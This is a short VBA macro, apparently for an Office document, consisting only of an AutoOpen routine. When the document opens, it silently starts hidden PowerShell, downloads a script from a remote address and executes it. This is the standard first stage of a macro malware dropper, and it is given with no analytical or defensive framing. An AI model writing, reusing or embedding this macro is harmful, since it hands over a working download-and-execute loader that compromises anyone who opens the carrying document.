Sub AutoOpen()
  Shell "powershell -nop -w hidden -c iex(iwr http://198.51.100.9/a)"
End Sub
